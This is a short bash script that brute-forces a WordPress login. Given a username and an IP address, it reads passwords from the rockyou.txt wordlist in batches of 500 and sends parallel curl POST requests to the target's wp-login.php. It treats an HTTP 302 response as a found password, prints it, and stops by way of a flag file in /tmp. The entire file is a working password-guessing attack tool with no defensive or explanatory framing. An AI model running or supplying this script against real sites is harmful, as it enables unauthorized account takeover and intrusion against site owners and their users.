#!/bin/bash

if [[ $# != 2 ]]; then
	printf "Usage: $0 USERNAME IP"
	exit
fi

Red='\033[0;31m'
Cyan='\033[0;36m'
Green='\033[0;32m'
Yellow='\033[1;33m'

#stop_file=$(mktemp)

trap "printf '\n${Red} [X] Stopping after a SIGINT from USER' && exit" SIGINT

printf "${Cyan} [!] Started at: $(date | cut -d " " -f4)" && printf "\n"

for i in {500..50000..500}; do
	printf "${Yellow} [*] Starting $i iteration\n" && for y in $(cat /usr/share/wordlists/rockyou.txt | head -n$i | tail -500); do 
		(
			result=$(curl -so /dev/null -X POST -b "wordpress_test_cookie=WP%20Cookie%20check" http://$2/wp-login.php -d "log=$1&pwd=$y&wp-submit=Log+In&redirect_to=http%3A%2F%2F$2%2Fwp-admin%2F&testcookie=1" -w "%{http_code}" 2>/dev/null) 
			if [[ $result == 302 ]]; then
				printf "\n${Red} [+] FOUND! Password: $y\n"
				stop_file=$(touch /tmp/ENDME)
			fi
		) &

	done
	
	wait

	printf "${Green} [!] Finished $i iterations\n\n"
	
	stop_file="/tmp/ENDME"
	if [[ -e $stop_file ]]; then
		rm -f "$stop_file"
		printf "${Cyan} [X] Stopped at: $(date | cut -d " " -f4)"
		exit
	fi

sleep 5

done
